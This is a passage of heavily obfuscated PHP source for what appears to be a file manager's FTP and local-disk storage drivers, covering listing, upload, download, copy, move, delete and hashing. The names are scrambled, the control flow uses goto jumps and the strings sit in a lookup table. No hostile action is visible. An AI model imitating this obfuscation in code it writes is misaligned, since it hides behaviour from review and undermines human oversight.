true) { goto DÑªèĞ³´ª; aÍ¥Í„¶’™: return !1; goto DÓÈ†ôÌİ; F‚ä»ò§èî: $this->fileList($C˜Î–‡©Ş, $eƒŸÆğÛÑ, $dèÌæå–‘², $a¥ˆˆö¥ƒ–); if ($AÆ–Ÿ½ˆ‚¹) { return array($A¿ËæˆÅí[203] => count($dèÌæå–‘²), $A¿ËæˆÅí[204] => count($eƒŸÆğÛÑ)); } if ($d·˜Êõ‰â£) { if (count($dèÌæå–‘²)) { return !0; } } else { if (count($eƒŸÆğÛÑ)) { return !0; } } goto aÍ¥Í„¶’™; DÑªèĞ³´ª: $A¿ËæˆÅí =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $eƒŸÆğÛÑ = $dèÌæå–‘² = array(); $a¥ˆˆö¥ƒ– = $AÆ–Ÿ½ˆ‚¹ ? !0 : !1; goto F‚ä»ò§èî; DÓÈ†ôÌİ: } public function listAll($e‘ „Û´šÆ) { goto EÙ™ˆ•¡•Ş; C¯ÁœêÑ·‚: foreach ($FŒÛ¢«Ï‚ as $A¿òøÏ ³‹) { if (is_string($A¿òøÏ ³‹)) { $Fš·óà÷Œ[$A¿òøÏ ³‹] = 0; } } return $this->listAllFiles($e‘ „Û´šÆ, array_keys($Fš·óà÷Œ), $Fš·óà÷Œ); goto e‚ÛùÑÄÉ; EÙ™ˆ•¡•Ş: $b‰ïì•Ò»¦ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$this->_isconn()) { return !1; } $FŒÛ¢«Ï‚ = $FŒŸÀô¿‚Ş = array(); goto Cö‹»ê§Œƒ; Cö‹»ê§Œƒ: $this->fileList($e‘ „Û´šÆ, $FŒÛ¢«Ï‚, $FŒŸÀô¿‚Ş, !0); $Fš·óà÷Œ = array(); foreach ($FŒŸÀô¿‚Ş as $A¿òøÏ ³‹) { $Fš·óà÷Œ[$A¿òøÏ ³‹[$b‰ïì•Ò»¦[28]]] = $A¿òøÏ ³‹[$b‰ïì•Ò»¦[78]]; } goto C¯ÁœêÑ·‚; e‚ÛùÑÄÉ: } public function getContent($a¼Š»´Üİ) { if (!$this->_isconn()) { return !1; } $a¼Š»´Üİ = $this->iconvSystem($a¼Š»´Üİ); return $this->fileSubstr($a¼Š»´Üİ); } public function setContent($C¹’¿—¥Œ¬, $b‘ë¹“‡Á = '') { goto F–‡­à˜·½; A™Ó¿ÔÈÖ÷: return $AÚª©ˆˆŒÃ; goto dÁØÆÌÎ; a‘ˆöÛ¶Êä: file_put_contents($FÇ“©ÍÃì—, $b‘ë¹“‡Á); $AÚª©ˆˆŒÃ = $this->upload($C¹’¿—¥Œ¬, $this->iconvApp($FÇ“©ÍÃì—)); $this->tempFileRemve($FÇ“©ÍÃì—); goto A™Ó¿ÔÈÖ÷; F–‡­à˜·½: if (!$this->_isconn()) { return !1; } $fÎÒïá¥Ğ = $this->pathThis($this->iconvSystem($C¹’¿—¥Œ¬)); $FÇ“©ÍÃì— = $this->tempFile($fÎÒïá¥Ğ); goto a‘ˆöÛ¶Êä; dÁØÆÌÎ: } public function fileSubstr($dæÜÜæ¼½ù, $cà†½¨‚Æî = 0, $C¾Ã–À­‘¿ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($dæÜÜæ¼½ù, $cà†½¨‚Æî, $C¾Ã–À­‘¿); } private function ftpRequest($aÁØ»Ï‰å¦, $dË‚©ê‹ïˆ = 0, $CÚù¼ñ«åæ = false) { goto e®²à½’šŞ; c¯ê‘ËÎÜ: curl_setopt($C˜¶ØÛ…±, CURLOPT_URL, $D·ğ¥ªÓ‚˜ . $this->pathEncode($aÁØ»Ï‰å¦)); curl_setopt($C˜¶ØÛ…±, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($CÚù¼ñ«åæ) { $f¨¶Ü‚ã = $dË‚©ê‹ïˆ + $CÚù¼ñ«åæ - 1; curl_setopt($C˜¶ØÛ…±, CURLOPT_RANGE, "{$dË‚©ê‹ïˆ}\55{$f¨¶Ü‚ã}"); } goto CîŞ´ÂòÉ ; fØ¤–‡³†¦: return $cÔ‡Ûƒ¡¾; goto BÓŞÚ£„èÂ; e®²à½’šŞ: $aÁØ»Ï‰å¦ = $this->iconvSystem($aÁØ»Ï‰å¦); $D·ğ¥ªÓ‚˜ = $this->scheme . $this->host . $_SERVER[Ôğ—¤Šµˆ˜ñ£][4] . $this->port; $C˜¶ØÛ…± = curl_init(); goto c¯ê‘ËÎÜ; CîŞ´ÂòÉ : curl_setopt($C˜¶ØÛ…±, CURLOPT_RETURNTRANSFER, 1); $cÔ‡Ûƒ¡¾ = curl_exec($C˜¶ØÛ…±); curl_close($C˜¶ØÛ…±); goto fØ¤–‡³†¦; BÓŞÚ£„èÂ: } public function upload($d¼‘šÆí¨İ, $B†‰§Ó¶•, $b§‹„Ú‹Æ‘ = false, $D‡‘µã˜ = REPEAT_REPLACE) { goto cá©ª£†Ó; a¹§ö‰ÖÚ¸: $B†‰§Ó¶• = $this->iconvSystem($B†‰§Ó¶•); $bÏù‘ÁŠø” = ftp_nb_put($this->connect, $d¼‘šÆí¨İ, $B†‰§Ó¶•, FTP_BINARY); while ($bÏù‘ÁŠø” == FTP_MOREDATA) { $bÏù‘ÁŠø” = ftp_nb_continue($this->connect); } goto Cô„æî…; cá©ª£†Ó: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($d¼‘šÆí¨İ))) { return !1; } $d¼‘šÆí¨İ = $this->iconvSystem($d¼‘šÆí¨İ); goto a¹§ö‰ÖÚ¸; Cô„æî…: if ($bÏù‘ÁŠø” != FTP_FINISHED) { return !1; } return $this->getPathOuter($d¼‘šÆí¨İ); goto cÂ•…Ğñ®–; cÂ•…Ğñ®–: } public function download($dÚ¿Æ‡‰˜á, $dŠ„¼ÄŸÙß = '') { goto eèöàøœŠÅ; eèöàøœŠÅ: if (!$this->_isconn()) { return !1; } $Dæ‚øéÛ†² = $this->pathFather($dŠ„¼ÄŸÙß); if (!IO::mkdir($Dæ‚øéÛ†²)) { return !1; } goto A–Ïá”»Á; A–Ïá”»Á: $dÚ¿Æ‡‰˜á = $this->iconvSystem($dÚ¿Æ‡‰˜á); $dŠ„¼ÄŸÙß = $this->iconvSystem($dŠ„¼ÄŸÙß); $F±šÅ¤î¶³ = ftp_nb_get($this->connect, $dŠ„¼ÄŸÙß, $dÚ¿Æ‡‰˜á, FTP_BINARY); goto E¶™ ËØÓ‘; E¶™ ËØÓ‘: while ($F±šÅ¤î¶³ == FTP_MOREDATA) { $F±šÅ¤î¶³ = ftp_nb_continue($this->connect); } if ($F±šÅ¤î¶³ != FTP_FINISHED) { return !1; } return $this->iconvApp($dŠ„¼ÄŸÙß); goto E—ŞÇ’˜¿¶; E—ŞÇ’˜¿¶: } public function exist($Fªòå¡öÔÑ) { return $this->isFile($Fªòå¡öÔÑ) || $this->isFolder($Fªòå¡öÔÑ); } public function isFile($Fƒ¢…²Ğù) { return !$this->isFolder($Fƒ¢…²Ğù) && $this->objectMeta($Fƒ¢…²Ğù); } public function isFolder($D¢¤‡èĞÎ) { return $this->cacheMethod($_SERVER[Ôğ—¤Šµˆ˜ñ£][199], $D¢¤‡èĞÎ); } protected function objectMeta($cª‹ñ…Å®) { return $this->cacheMethod($_SERVER[Ôğ—¤Šµˆ˜ñ£][200], $cª‹ñ…Å®); } protected function _objectMeta($FºØçô“Çñ) { goto EÖ‰Û÷™‹; DÒ˜÷¨³È°: $F¦³™™éŞ‰ = @ftp_size($this->connect, $FºØçô“Çñ); if ($F¦³™™éŞ‰ != -1) { $Eêö«ô†Çì[$B²‹ß£´ô¡[78]] = $F¦³™™éŞ‰; } else { $D¸ç„™Û×œ = @ftp_chdir($this->connect, $FºØçô“Çñ); if (!$D¸ç„™Û×œ) { return !1; } $Eêö«ô†Çì[$B²‹ß£´ô¡[29]] = $B²‹ß£´ô¡[77]; } return $Eêö«ô†Çì; goto cÓ´ôº³; b¯áÖî©¢‹: $FºØçô“Çñ = $this->iconvSystem($FºØçô“Çñ); $Eêö«ô†Çì = array($B²‹ß£´ô¡[28] => $this->iconvApp($FºØçô“Çñ), $B²‹ß£´ô¡[29] => $B²‹ß£´ô¡[193], $B²‹ß£´ô¡[78] => 0); @ftp_chdir($this->connect, $B²‹ß£´ô¡[8]); goto DÒ˜÷¨³È°; EÖ‰Û÷™‹: $B²‹ß£´ô¡ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($FºØçô“Çñ == $B²‹ß£´ô¡[33] || $FºØçô“Çñ == $B²‹ß£´ô¡[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto b¯áÖî©¢‹; cÓ´ôº³: } protected function _isFolder($D’çÖëš¥ß) { $Bµèù„ïÄ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($D’çÖëš¥ß == $Bµèù„ïÄ[33] || $D’çÖëš¥ß == $Bµèù„ïÄ[8]) { return !0; } $EˆëÄ¥šãØ = $this->_objectMeta($D’çÖëš¥ß); return isset($EˆëÄ¥šãØ[$Bµèù„ïÄ[29]]) && $EˆëÄ¥šãØ[$Bµèù„ïÄ[29]] == $Bµèù„ïÄ[77] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($D‘İÀ¯îïÌ) { if (substr($D‘İÀ¯îïÌ, 0, 2) == $_SERVER[Ôğ—¤Šµˆ˜ñ£][1266]) { $D‘İÀ¯îïÌ = BASIC_PATH . substr($D‘İÀ¯îïÌ, 2); } return $D‘İÀ¯îïÌ; } public function iconvApp($bñó»”±“‚) { $EÙ˜Çõ½½À =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; global $config; return $this->iconvTo($bñó»”±“‚, $config[$EÙ˜Çõ½½À[1264]], $config[$EÙ˜Çõ½½À[1263]]); } public function iconvSystem($dĞÔŞ…„­ø) { $bìùÍÉ’± =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; global $config; return $this->iconvTo($dĞÔŞ…„­ø, $config[$bìùÍÉ’±[1263]], $config[$bìùÍÉ’±[1264]]); } public function getPathOuter($cÖ”÷µİÔÜ) { goto eÂãß‹¥Ù†; FìåÙ÷‘: $cÖ”÷µİÔÜ = KodIO::clear($cÖ”÷µİÔÜ); $cÖ”÷µİÔÜ = substr($cÖ”÷µİÔÜ, strlen($D²ßÈ‰·£“)); if (empty($this->pathDriver)) { return $cÖ”÷µİÔÜ; } goto AÕôÄ“ÒåÃ; AÕôÄ“ÒåÃ: return $this->pathDriver . $b·¸ÊñÜæî[8] . ltrim($cÖ”÷µİÔÜ, $b·¸ÊñÜæî[8]); goto aÇèïñ£×¤; eÂãß‹¥Ù†: $b·¸ÊñÜæî =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $D²ßÈ‰·£“ = $this->iconvApp($this->pathBase); $cÖ”÷µİÔÜ = $this->iconvApp($cÖ”÷µİÔÜ); goto Cøèµïã±÷; Cøèµïã±÷: if (substr($D²ßÈ‰·£“, 0, 2) == $b·¸ÊñÜæî[1266]) { $D²ßÈ‰·£“ = BASIC_PATH . substr($D²ßÈ‰·£“, 2); } if (substr($cÖ”÷µİÔÜ, 0, 2) == $b·¸ÊñÜæî[1266]) { $cÖ”÷µİÔÜ = BASIC_PATH . substr($cÖ”÷µİÔÜ, 2); } $D²ßÈ‰·£“ = KodIO::clear($D²ßÈ‰·£“); goto FìåÙ÷‘; aÇèïñ£×¤: } public function mkfile($fÜ¸Ş‰†¼õ, $Fõ“©Ñ½Ì = '', $dƒ£Ø¼éÅ¹ = REPEAT_RENAME) { $fÜ¸Ş‰†¼õ = $this->iconvSystem($fÜ¸Ş‰†¼õ); @touch($fÜ¸Ş‰†¼õ); if ($Fõ“©Ñ½Ì) { file_put_contents($fÜ¸Ş‰†¼õ, $Fõ“©Ñ½Ì); } @chmod($fÜ¸Ş‰†¼õ, $this->pathAuth); return is_file($fÜ¸Ş‰†¼õ) ? $this->getPathOuter($fÜ¸Ş‰†¼õ) : !1; } public function mkdir($F¥©ÉøéğÏ, $eèàºêò­¹ = REPEAT_SKIP) { $F¥©ÉøéğÏ = $this->iconvSystem($F¥©ÉøéğÏ); if (is_dir($F¥©ÉøéğÏ)) { return $this->getPathOuter($F¥©ÉøéğÏ); } @mkdir($F¥©ÉøéğÏ, $this->pathAuth, !0); @chmod($F¥©ÉøéğÏ, $this->pathAuth); return is_dir($F¥©ÉøéğÏ) ? $this->getPathOuter($F¥©ÉøéğÏ) : !1; } public function copyFile($a‹Öëšóàô, $E´«äâÓé™) { $this->mkdir($this->pathFather($E´«äâÓé™)); $a‹Öëšóàô = $this->iconvSystem($a‹Öëšóàô); $E´«äâÓé™ = $this->iconvSystem($E´«äâÓé™); $bœ‰æ›—™ = copy_64($a‹Öëšóàô, $E´«äâÓé™); @chmod($E´«äâÓé™, $this->pathAuth); return $bœ‰æ›—™ ? $this->getPathOuter($E´«äâÓé™) : !1; } public function moveFile($Eİ‹Ã®™Á, $a—‚ï‡¼Âˆ) { goto CÉîœó‡˜Ê; CÉîœó‡˜Ê: $this->mkdir($this->pathFather($a—‚ï‡¼Âˆ)); $Eİ‹Ã®™Á = $this->iconvSystem($Eİ‹Ã®™Á); $a—‚ï‡¼Âˆ = $this->iconvSystem($a—‚ï‡¼Âˆ); goto d²¾¡À¹é¯; d²¾¡À¹é¯: $d²ïâò«óÔ = intval(@rename($Eİ‹Ã®™Á, $a—‚ï‡¼Âˆ)); if (!$d²ïâò«óÔ) { if ($d²ïâò«óÔ = intval(@copy_64($Eİ‹Ã®™Á, $a—‚ï‡¼Âˆ))) { @unlink($Eİ‹Ã®™Á); } } @chmod($a—‚ï‡¼Âˆ, $this->pathAuth); goto cí¹«—”ƒñ; cí¹«—”ƒñ: return $d²ïâò«óÔ ? $this->getPathOuter($a—‚ï‡¼Âˆ) : !1; goto fİ­³À–§; fİ­³À–§: } public function delFile($F‹©½‰‡Íê) { $F‹©½‰‡Íê = $this->iconvSystem($F‹©½‰‡Íê); if (!@unlink($F‹©½‰‡Íê)) { @chmod($F‹©½‰‡Íê, $this->pathAuth); if (!@unlink($F‹©½‰‡Íê)) { return !1; } } else { return !0; } } public function delFolder($aÏ„ö­¯Ó) { goto fâÕ‚ÑÚŠ×; a¢íÛ…Ä…Ã: return rmdir($aÏ„ö­¯Ó); goto Aî² °¼Ÿù; f‹¬é” : if (!($cÀ“ÓŞÓõÜ = opendir($aÏ„ö­¯Ó))) { return !1; } while (($E² ¸†Á · = readdir($cÀ“ÓŞÓõÜ)) !== !1) { if ($E² ¸†Á · == $C´İá®ÑĞç[95] || $E² ¸†Á · == $C´İá®ÑĞç[1273]) { continue; } $aàÆ˜òİ = $aÏ„ö­¯Ó . $C´İá®ÑĞç[8] . $E² ¸†Á ·; if (is_file($aàÆ˜òİ) || is_link($aàÆ˜òİ)) { if (!unlink($aàÆ˜òİ)) { chmod($aàÆ˜òİ, $this->pathAuth); if (!unlink($aàÆ˜òİ)) { return !1; } } } else { if (is_dir($aàÆ˜òİ)) { chmod($aàÆ˜òİ, $this->pathAuth); $aàÆ˜òİ = $this->iconvApp($aàÆ˜òİ); if (!$this->delFolder($aàÆ˜òİ)) { return !1; } } } } closedir($cÀ“ÓŞÓõÜ); goto a¢íÛ…Ä…Ã; fâÕ‚ÑÚŠ×: $C´İá®ÑĞç =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $aÏ„ö­¯Ó = $this->iconvSystem($aÏ„ö­¯Ó); if (!is_dir($aÏ„ö­¯Ó)) { return !0; } goto f‹¬é” ; Aî² °¼Ÿù: } public function rename($eÀ†¿Ö™½, $C‡ÑÈ‹ ª§) { goto a« ‡Û©“; Fç˜®§•–õ: $eÀ†¿Ö™½ = $this->iconvSystem($eÀ†¿Ö™½); $E¹ŞÔÁò©Ç = $this->pathFather($eÀ†¿Ö™½); $EÀ’Üš£à = rtrim($E¹ŞÔÁò©Ç, $D¼ó©ÃõÖç[8]) . $D¼ó©ÃõÖç[8] . $eÁ«â†ÀÉ»; goto Dèä¡Íø…; a« ‡Û©“: $D¼ó©ÃõÖç =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $eÁ«â†ÀÉ» = $this->fileNameAuto($this->pathFather($eÀ†¿Ö™½), $C‡ÑÈ‹ ª§); $eÁ«â†ÀÉ» = $this->iconvSystem($eÁ«â†ÀÉ»); goto Fç˜®§•–õ; Dèä¡Íø…: $B½ÇÑ­ì‘² = @rename($eÀ†¿Ö™½, $EÀ’Üš£à); $EÀ’Üš£à = $this->iconvApp($EÀ’Üš£à); return $B½ÇÑ­ì‘² ? $this->getPathOuter($EÀ’Üš£à) : !1; goto d‹”¦ÉÒÂ; d‹”¦ÉÒÂ: } public function size($E‘â·Ÿ´¦) { $E‘â·Ÿ´¦ = $this->iconvSystem($E‘â·Ÿ´¦); return filesize_64($E‘â·Ÿ´¦); } public function info($a§¢²Œà¾À) { $a§¢²Œà¾À = $this->iconvSystem($a§¢²Œà¾À); if ($this->isFolder($a§¢²Œà¾À)) { return $this->folderInfo($a§¢²Œà¾À); } else { if ($this->isFile($a§¢²Œà¾À)) { return $this->fileInfo($a§¢²Œà¾À); } } return !1; } protected function infoChildren($F…•¤±¿«, &$DæŠë‰Ò…Ô, $Dö“ñ„ÀØ¯ = true) { goto A‡©íÊŒ; cÏà›¸ÇÃ¶: if ($Dö“ñ„ÀØ¯) { $F…•¤±¿« = $this->iconvSystem($F…•¤±¿«); } if (!($eğÂ¥òÅˆƒ = @opendir($F…•¤±¿«))) { return; } while (($dŒ¢ÏÓ„Öõ = readdir($eğÂ¥òÅˆƒ)) !== !1) { if ($dŒ¢ÏÓ„Öõ == $dÈ»ÍÓèßñ[95] || $dŒ¢ÏÓ„Öõ == $dÈ»ÍÓèßñ[1273]) { continue; } $AŒ×’»«ª = $F…•¤±¿« . $dŒ¢ÏÓ„Öõ; if (is_file($AŒ×’»«ª) || is_link($AŒ×’»«ª)) { $DæŠë‰Ò…Ô[$dÈ»ÍÓèßñ[79]]++; $DæŠë‰Ò…Ô[$dÈ»ÍÓèßñ[78]] += filesize_64($AŒ×’»«ª); } else { if (is_dir($AŒ×’»«ª)) { $DæŠë‰Ò…Ô[$dÈ»ÍÓèßñ[80]]++; $this->infoChildren($AŒ×’»«ª, $DæŠë‰Ò…Ô, !1); } } } goto cÌ´Š©å¤ƒ; A‡©íÊŒ: $dÈ»ÍÓèßñ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; check_abort_echo(); $F…•¤±¿« = rtrim($F…•¤±¿«, $dÈ»ÍÓèßñ[8]) . $dÈ»ÍÓèßñ[8]; goto cÏà›¸ÇÃ¶; cÌ´Š©å¤ƒ: closedir($eğÂ¥òÅˆƒ); goto AĞ‰’õàŒÖ; AĞ‰’õàŒÖ: } private function folderInfo($fŠ¯ÓŞß¯¨, $bÏêí»Î‘ê = false) { $f©ƒ¤à¿¨ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $fŠ¯ÓŞß¯¨ = rtrim($fŠ¯ÓŞß¯¨, $f©ƒ¤à¿¨[8]) . $f©ƒ¤à¿¨[8]; $Cì¦¶ñÆŸŒ = $this->iconvApp($this->pathThis($fŠ¯ÓŞß¯¨)); if ($bÏêí»Î‘ê) { return array($f©ƒ¤à¿¨[28] => $Cì¦¶ñÆŸŒ, $f©ƒ¤à¿¨[76] => $this->getPathOuter($fŠ¯ÓŞß¯¨), $f©ƒ¤à¿¨[29] => $f©ƒ¤à¿¨[77]); } $CóÀ”¡–ƒ‹ = array($f©ƒ¤à¿¨[28] => $Cì¦¶ñÆŸŒ, $f©ƒ¤à¿¨[76] => $this->getPathOuter($fŠ¯ÓŞß¯¨), $f©ƒ¤à¿¨[29] => $f©ƒ¤à¿¨[77], $f©ƒ¤à¿¨[194] => @filectime($fŠ¯ÓŞß¯¨), $f©ƒ¤à¿¨[84] => @filemtime($fŠ¯ÓŞß¯¨), $f©ƒ¤à¿¨[1276] => @fileatime($fŠ¯ÓŞß¯¨), $f©ƒ¤à¿¨[1277] => is_readable($fŠ¯ÓŞß¯¨), $f©ƒ¤à¿¨[1278] => is_writable($fŠ¯ÓŞß¯¨), $f©ƒ¤à¿¨[1279] => get_mode($fŠ¯ÓŞß¯¨)); return $CóÀ”¡–ƒ‹; } private function fileInfo($FĞß¾‹êˆ, $FĞÅ­ˆ²¾ = false) { $d½»†Á‚… =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $b•á˜³çŸ¨ = $this->iconvApp($this->pathThis($FĞß¾‹êˆ)); if ($FĞÅ­ˆ²¾) { return array($d½»†Á‚…[28] => $b•á˜³çŸ¨, $d½»†Á‚…[76] => $this->getPathOuter($FĞß¾‹êˆ), $d½»†Á‚…[29] => $d½»†Á‚…[193], $d½»†Á‚…[78] => $this->size($FĞß¾‹êˆ), $d½»†Á‚…[168] => $this->ext($b•á˜³çŸ¨)); } $Eªãõ‡ÆÖõ = array($d½»†Á‚…[28] => $b•á˜³çŸ¨, $d½»†Á‚…[76] => $this->getPathOuter($FĞß¾‹êˆ), $d½»†Á‚…[29] => $d½»†Á‚…[193], $d½»†Á‚…[194] => @filectime($FĞß¾‹êˆ), $d½»†Á‚…[84] => @filemtime($FĞß¾‹êˆ), $d½»†Á‚…[1276] => @fileatime($FĞß¾‹êˆ), $d½»†Á‚…[78] => $this->size($FĞß¾‹êˆ), $d½»†Á‚…[168] => $this->ext($b•á˜³çŸ¨), $d½»†Á‚…[1277] => is_readable($FĞß¾‹êˆ), $d½»†Á‚…[1278] => is_writable($FĞß¾‹êˆ), $d½»†Á‚…[1279] => get_mode($FĞß¾‹êˆ)); return $Eªãõ‡ÆÖõ; } public function exist($E³œ÷›™«ö) { $E³œ÷›™«ö = $this->iconvSystem($E³œ÷›™«ö); return @file_exists($E³œ÷›™«ö); } public function isFile($B÷‚«ÌŞ) { $B÷‚«ÌŞ = $this->iconvSystem($B÷‚«ÌŞ); return @is_file($B÷‚«ÌŞ); } public function isFolder($F“éŠÛ¶”‡) { $F“éŠÛ¶”‡ = $this->iconvSystem($F“éŠÛ¶”‡); return @is_dir($F“éŠÛ¶”‡); } public function listPath($B¢–Ü†Á¼¸, $AÏ÷‰‹ËÇ = false) { goto aÌ­Åî°¶à; BÄƒÖĞÃ¶Ş: $EÔ¥…‰—ç = array($D«»±ëêâñ[75] => array(), $D«»±ëêâñ[74] => array()); if (!($EîÛù¿Ìˆ¦ = @opendir($B¢–Ü†Á¼¸))) { return $EÔ¥…‰—ç; } while (($D­£õ©÷ë½ = readdir($EîÛù¿Ìˆ¦)) !== !1) { if ($D­£õ©÷ë½ == $D«»±ëêâñ[95] || $D­£õ©÷ë½ == $D«»±ëêâñ[1273]) { continue; } $aÚªÕÔç¡ = $B¢–Ü†Á¼¸ . $D­£õ©÷ë½; if (is_file($aÚªÕÔç¡)) { $EÔ¥…‰—ç[$D«»±ëêâñ[74]][] = $this->fileInfo($aÚªÕÔç¡, $AÏ÷‰‹ËÇ); } else { $EÔ¥…‰—ç[$D«»±ëêâñ[75]][] = $this->folderInfo($aÚªÕÔç¡, $AÏ÷‰‹ËÇ); } } goto e¸¦è¿Ø„; aÌ­Åî°¶à: $D«»±ëêâñ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $B¢–Ü†Á¼¸ = $this->iconvSystem($B¢–Ü†Á¼¸); $B¢–Ü†Á¼¸ = rtrim($B¢–Ü†Á¼¸, $D«»±ëêâñ[8]) . $D«»±ëêâñ[8]; goto BÄƒÖĞÃ¶Ş; e¸¦è¿Ø„: closedir($EîÛù¿Ìˆ¦); return $EÔ¥…‰—ç; goto aõÃÓÙ³Ñ°; aõÃÓÙ³Ñ°: } public function listAll($eÎ±ŠÅ†í½, &$BÓ”¾‘¡’ = array()) { goto e‰ËÁ­“˜Ú; BĞ³¼øÊå: return $BÓ”¾‘¡’; goto dŒ›Ğ·„Î•; FÏé÷ïˆï: if (!($cØñîÀÄî· = @opendir($eÎ±ŠÅ†í½))) { return $BÓ”¾‘¡’; } while (($BÜ¬Ø¶¤•ˆ = readdir($cØñîÀÄî·)) !== !1) { if ($BÜ¬Ø¶¤•ˆ == $fÚÆ¦Á¶¢[95] || $BÜ¬Ø¶¤•ˆ == $fÚÆ¦Á¶¢[1273]) { continue; } $D×’©¶Ô‡Í = $eÎ±ŠÅ†í½ . $BÜ¬Ø¶¤•ˆ; if (is_dir($D×’©¶Ô‡Í) && !is_link($D×’©¶Ô‡Í)) { $BÓ”¾‘¡’[] = array($fÚÆ¦Á¶¢[76] => $D×’©¶Ô‡Í . $fÚÆ¦Á¶¢[8], $fÚÆ¦Á¶¢[77] => 1, $fÚÆ¦Á¶¢[84] => @filemtime($D×’©¶Ô‡Í), $fÚÆ¦Á¶¢[78] => 0); $this->listAll($D×’©¶Ô‡Í, $BÓ”¾‘¡’); } else { $BÓ”¾‘¡’[] = array($fÚÆ¦Á¶¢[76] => $D×’©¶Ô‡Í, $fÚÆ¦Á¶¢[77] => 0, $fÚÆ¦Á¶¢[84] => @filemtime($D×’©¶Ô‡Í), $fÚÆ¦Á¶¢[78] => $this->size($D×’©¶Ô‡Í)); } } closedir($cØñîÀÄî·); goto BĞ³¼øÊå; e‰ËÁ­“˜Ú: $fÚÆ¦Á¶¢ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $eÎ±ŠÅ†í½ = $this->iconvSystem($eÎ±ŠÅ†í½); $eÎ±ŠÅ†í½ = rtrim($eÎ±ŠÅ†í½, $fÚÆ¦Á¶¢[8]) . $fÚÆ¦Á¶¢[8]; goto FÏé÷ïˆï; dŒ›Ğ·„Î•: } public function has($e˜ÜŠ‰°, $C³µÈ©¼Šä = false, $d½ª›œ¼² = true) { goto Aò¦ä´ÈùÎ; cœ¯‚ Î…: if ($C³µÈ©¼Šä) { return array($dì†Öê×˜Ã[203] => $A©ø·…µÔ, $dì†Öê×˜Ã[204] => $aò™Ë¦éõµ); } return !1; goto E’ƒŠÄà„¿; Aò¦ä´ÈùÎ: $dì†Öê×˜Ã =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $e˜ÜŠ‰° = $this->iconvSystem($e˜ÜŠ‰°); $e˜ÜŠ‰° = rtrim($e˜ÜŠ‰°, $dì†Öê×˜Ã[8]) . $dì†Öê×˜Ã[8]; goto AƒîˆÀ…‰Â; AƒîˆÀ…‰Â: if (!($eîŸ“¹Çğ… = @opendir($e˜ÜŠ‰°))) { return !1; } $A©ø·…µÔ = 0; $aò™Ë¦éõµ = 0; goto dÆÛìó½œä; dÆÛìó½œä: $AÜŒ´ªğëÍ = 0; while (($eñ”½Û²‚œ = readdir($eîŸ“¹Çğ…)) !== !1) { if ($eñ”½Û²‚œ == $dì†Öê×˜Ã[95] || $eñ”½Û²‚œ == $dì†Öê×˜Ã[1273]) { continue; } $E‘–š¬×¤Õ = $e˜ÜŠ‰° . $eñ”½Û²‚œ; if ($C³µÈ©¼Šä) { $AÜŒ´ªğëÍ++; if (@is_file($E‘–š¬×¤Õ)) { $A©ø·…µÔ++; } else { $aò™Ë¦éõµ++; } if ($AÜŒ´ªğëÍ > 10000) { break; } continue; } if ($d½ª›œ¼²) { if (@is_file($E‘–š¬×¤Õ)) { return !0; } } else { if (@is_dir($E‘–š¬×¤Õ . $dì†Öê×˜Ã[8])) { return !0; } } } closedir($eîŸ“¹Çğ…); goto cœ¯‚ Î…; E’ƒŠÄà„¿: } public function hashSimple($f‰ƒÊÚ²Èù) { goto aÊíÛ÷î¬; aÊíÛ÷î¬: $B•ÁËµ”Ãâ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$f‰ƒÊÚ²Èù) { return md5($B•ÁËµ”Ãâ[33]); } $f‰ƒÊÚ²Èù = $this->iconvSystem($f‰ƒÊÚ²Èù); goto aÅÙâ÷¡â¤; c²ÂÜ÷»‚‡: $aˆÏ’Ş•Ñ = fopen($f‰ƒÊÚ²Èù, $B•ÁËµ”Ãâ[1280]); if (!$aˆÏ’Ş•Ñ) { return $c´¥÷”ôè; } for ($d‘·«Ğ³¼š = 0; $d‘·«Ğ³¼š < $FåšÏê©ÁÁ; $d‘·«Ğ³¼š++) { fseek_64($aˆÏ’Ş•Ñ, $aŞ¯¯’Ã»¥ * $d‘·«Ğ³¼š); $c´¥÷”ôè .= fread($aˆÏ’Ş•Ñ, $A‘©Ùƒ§¿Ë); } goto dç·”„¶©¬; b›ÆºÛÌÚ¸: if ($F¶ñô ö­ <= $A‘©Ùƒ§¿Ë * $FåšÏê©ÁÁ) { return $this->hashMd5($f‰ƒÊÚ²Èù) . $F¶ñô ö­; } $c´¥÷”ôè = $B•ÁËµ”Ãâ[33]; $aŞ¯¯’Ã»¥ = intval($F¶ñô ö­ / $FåšÏê©ÁÁ); goto c²ÂÜ÷»‚‡; bŸíÁ±Ô±: return md5($c´¥÷”ôè) . $F¶ñô ö­; goto d¥—ãğôñ; aÅÙâ÷¡â¤: $F¶ñô ö­ = $this->size($f‰ƒÊÚ²Èù); $A‘©Ùƒ§¿Ë = 200; $FåšÏê©ÁÁ = 50; goto b›ÆºÛÌÚ¸; dç·”„¶©¬: fseek_64($aˆÏ’Ş•Ñ, $F¶ñô ö­ - $A‘©Ùƒ§¿Ë); $c´¥÷”ôè .= fread($aˆÏ’Ş•Ñ, $A‘©Ùƒ§¿Ë); fclose($aˆÏ’Ş•Ñ); goto bŸíÁ±Ô±; d¥—ãğôñ: } public function getContent($eÜ¶™Ğ«İŸ) { $eÜ¶™Ğ«İŸ = $this->iconvSystem($eÜ¶™Ğ«İŸ); return file_get_contents($eÜ¶™Ğ«İŸ); } public function 